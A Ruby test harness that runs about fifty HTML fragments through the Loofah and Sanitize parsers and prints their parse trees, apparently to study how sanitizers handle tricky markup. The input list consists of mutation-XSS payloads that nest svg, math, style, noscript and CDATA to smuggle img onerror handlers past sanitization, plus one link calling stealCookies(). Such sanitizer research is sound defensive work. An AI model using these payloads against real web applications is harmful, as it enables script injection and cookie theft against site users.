require 'loofah'
require 'sanitize'
require 'nokogiri'

def fix(s)
  s.gsub("\\", "\\\\").gsub("\"", "\\\"")
end
class Nokogiri::XML::Comment

  def format(*a)
    "(#comment \"" << fix(self.content) <<  "\")"
  end
end
class Nokogiri::XML::Attr

  def format(*a)
    '(#attr "%s" "%s")' % [fix(self.name), fix(self.value)]
  end
end

class Nokogiri::XML::Text

  def format(*a)
    "(#text \"" << fix(self.content) <<  "\")"
  end
end

class Nokogiri::XML::Element
  def format(*a)
    attrs = []
    self.attributes.each do |param|
      attrs << param[1].format
    end

    output = [
      "(#tag \"#{fix(self.name)}\" [",
      #puts param
      attrs.join(', '),
      '] [' ].join('')
    r = self.children.map{ |n| n.format }.join(', ')
    output << r << "])"
    output
  end
end

class Loofah::HTML::DocumentFragment
  def format(*a)
    out = "(#document-fragment ["
    cs = []
    self.children.each do |d|
      cs << d.format
    end
    out << cs.join(', ') << "])"
    out
  end
end

class Nokogiri::HTML5::DocumentFragment
  def format(*a)
    out = "(#document-fragment ["
    cs = []
    self.children.each do |d|
      cs << d.format
    end
    out << cs.join(', ') << "])"
    out
  end
end




html = [
  "<svg>/*\"<img src=x onerror=mxss(1)><select>*/</svg>",
  "<svg><svg>'<style><noscript><img src=x onerror=mxss(1)>/*</style></svg><input><select></svg><style><div>",
  "<keygen></br><svg></br>/*<noscript><img src=x onerror=mxss(1)></noscript>*/<style></svg></keygen>",
  "<svg>/*<p><img src=x onerror=mxss(1)></p>*/</svg>",
  "<svg title=<p>/*<textarea><form><math></p></style><form>*/<style></select><img src=x onerror=mxss(1)></form></mglyph></textarea>*/</p>\"><span>",
  "<mglyph>/*</style><svg><input data-foo=<div></br><noscript></p><mglyph><img src=x onerror=mxss(1)></mglyph></noscript></div>'><br></span></svg>\"<math>*/</mglyph>",

  "<svg><div id=<div><div><![CDATA[<!--<!--<style>--><img id=a src=x onerror=mxss(1)></pre>--!><ul><dl>]]><mo></style></div>>",
  "<!--<a> <style>><c>",
  "<noscript><!--</noscript>><div><img src=x onerror=alert(1)>--></template></div>",
  "<p><a href='http://example.com/' onclick='stealCookies()'>Link</a></p>",
  "<select><template><style><!--</style><a rel=\"--></style></template></select><img id=a src onerror=alert(1)>\">",
  "<form><math><mtext></form><form><mglyph><style></math><img id=a src onerror=alert(1)>",
  "<x/><title>&amp;lt;/title&amp;gt;&amp;lt;img id=a src=1 onerror=alert(1)&amp;gt;",
  "<noscript><a title=\"</noscript><img id=a src=x onerror=alert(1)>\">",
  "<noscript><style></noscript><img id=a src=x onerror=alert(1)>",
  "<svg><style><img id=a src=x onerror=alert(1)></style></svg>",
  "<svg><style>/*</style><img id=a src onerror=alert(1)",
  "<svg><textarea></textarea><img id=a src onerror=alert(1)",
  "<style><mglyph><textarea title='<!--<!--</style><img id=a src=x onerror=mxss(1)></mtext><!---->-->'></mglyph></style>",
  "<div id='--!><style><!--</form><form id='<select><img id=a src=x onerror=mxss(1)></select>--!>'>--!>--!><!---->--!></style></style>'>",
  "<span><mglyph><span foo='<!--<keygen><math><style title='<a><img id=a src=x onerror=mxss(1)></a></noscript>'></math></keygen>-->'></mglyph><!--<style></span>--!>",
  "<a foo='<!--<span foo='/*<!--<select><img id=a src=x onerror=mxss(1)></select><br></mglyph>--><textarea>'>-->'>",
  "<textarea></noscript><mtext></textarea><!----!><img id=a src=x onerror=mxss(1)><input></select>/*--></mtext></mglyph>",
  "</span><form>/*<svg></p>/*<form></form><img id=a src=x onerror=mxss(1)><div></form></div></br>--!></svg><p></style></form>",
  "<form foo=<a id=<!--<mglyph title=/*<style><form><img id=a src=x onerror=mxss(1)></form></style>'>-->>><div>",
  "</form><math><style><img id=a src=x onerror=mxss(1)><math></style><style></math><div>",
  "<a id=/*<!--</div><img id=a src=x onerror=mxss(1)>-->><style>",
  "<mglyph></select><mglyph><svg><img id=a src=x onerror=mxss(1)></svg></mglyph><select></mglyph>",
  "<div><math>\"<br><a><a id='<!--</svg>--!><span id='<math><img id=a src=x onerror=mxss(1)></math>></style>--><!--'></a></br></math></div>",
  "<style id=<span><mtext><style data-foo=/*<input></a></style><mglyph><mtext title=<script>mxss(1)</script>'></input>\"></mtext></span>><!--\"",
  "<a id=<span><svg data-foo=\"<mglyph title=\"</style><style>&lt;select&gt;&lt;img id=a src=x onerror=mxss(1)&gt;&lt;div&gt;&lt;/select&gt;<keygen>\"><p><!--></span></title></span>>",
  "<select><var><div foo=<!--</math><!--<iframe><select><keygen></mi><img id=a src=x onerror=mxss(1)></keygen></select></plaintext></iframe>--!></td><!--</xmp>--!>></select>",
  "<noembed>--!><select><iframe><mglyph><select><img id=a src=x onerror=mxss(1)></select></mglyph></iframe></select>/*</noembed>",
  "<svg><style id=<div><style><![CDATA[<!--<!--<style>--><img id=a src=x onerror=mxss(1)></pre>--!><ul><dl>]]><mo></style></div>>",
  "<var><svg></foreignobject><style></br><![CDATA[</plaintext>/*</ms><div>\"<img id=a src=x onerror=mxss(1)></div><script>]]></style></br></svg></var>",
  "<svg title=\"<annotation-xml foo=<annotation-xml encoding=\"application/xhtml+xml\">--><style title=''</annotation-xml>/*&lt;img id=a src=x onerror=mxss(1)&gt;\"<noembed>''>--!>>\">",
  "<svg><style foo=<noframes>-->&lt;img id=a src=x onerror=mxss(1)&gt;--&gt;&lt;!--]]></pre></xmp><annotation-xml encoding=\"application/xhtml+xml\">\">]]></svg><mglyph></dfn>",
  "<noscript xmlns=\"http://www.w3.org/1998/Math/MathML\"><a title=\"\"></noscript><img id=a src=x onerror=alert(1)>\">",
  "<select><var><div foo=<!--</math><!--<iframe><select><keygen></mi><img src=x onerror=mxss(1)></keygen></select></plaintext></iframe>--!></td><!--</xmp>--!>></select>",
  "<desc data-foo=<br><select><mglyph><iframe>/*<style>-->--!><keygen><img src=x onerror=mxss(1)><title></keygen></style></path><noembed><path></mglyph></br>>",
  "<select>\"</plaintext></listing><iframe><ms><ul><input title=<annotation-xml encoding=\"application/xhtml+xml\"><input>--><annotation-xml encoding=\"application/xhtml+xml\"><mtext><img src=x onerror=mxss(1)></mtext></annotation-xml></input></annotation-xml>></ms>/*</select>",
  "<svg title=\"<annotation-xml foo=<annotation-xml encoding=\"application/xhtml+xml\">--><style title=''</annotation-xml>/*&lt;img src=x onerror=mxss(1)&gt;\"<noembed>''>--!>>\">",
  "<select><keygen><iframe title=<table><mi><keygen>'<mglyph><img src=x onerror=mxss(1)>--!></mglyph></keygen>--!></mtext><var><pre></mi></table></xmp>></keygen></select>",
  "<br/><hr><br><p></br></div><div> <!-- foo -->",
  "<div><![CDATA[<img src=x onerror=mxss(1)]]>",
  "<select><template><style><!--</style><a data-foo=\"--></style></template></select><img id=a src onerror=alert(1)>\">",
  "<style title='<ul>  <![CDATA[<!--<dfn><tr foo=<option><img src=x onerror=mxss(1)></option>></dfn>--!>]]> '</ul>'></path> '",
  " %3Cstyle%20data-foo=\"%3Cdl%20title='%3Coption%3E%3Cdesc%3E%3C/div%3E%3Cdiv%20title=%3C/select%3E%3",
  "]]><plaintext id='<img src=x onerror=mxss(1)>\">",
  " <option></select><textarea><![CDATA[<listing><foreignobject/></foreignobject> <iframe><math title='<div></textarea>\"<dfn><img src=x onerror=mxss(1)><!--<!--<select> </div>>*/<pre/></listing><mglyph></dl></span>",
  "<svg><div id=<div><div><![CDATA[<!--<!--<style>--><img id=a src=x onerror=mxss(1)></pre>--!><ul><dl>]]><mo></style></div>>",
  "<select><template><! <style></style><a data-foo= \"--!></style></template></select><img id=a src onerror=alert(1)>\">'",
  "<div><![CDATA[<img src=x onerror=mxss(1)]]>",
  "<div><img/src=x yonerror=mxss(1)]]>",

]
#html = "<iframe> <div id='</iframe><img src=x onerror=alert()>'>"


#puts foobar
html.each { |x|
foo = Loofah.fragment(x)
puts "{|%s|};"%[foo.format]
done = false
serialized = ""
transformer = lambda do |env|
  return if done
  doc = env[:node]
  serialized =  doc.format
  done = true
end
foobar = Sanitize.fragment(x, Sanitize::Config.merge(Sanitize::Config::RELAXED,
                                                        :transformers => transformer,
                                                        :elements        => Sanitize::Config::BASIC[:elements] + %w[div span title form dfn header p br a style table td tr colgroup svg foreignobject desc path math mtext mglyph mi mo mn ms annotation-xml noscript select input textarea keygen xmp noembed listing li ul pre var dl dt iframe noframes frameset script font option object embed],
                                                        ))
puts "{|%s|};"%[serialized]
#puts foo.scrub!(:strip).to_s
}

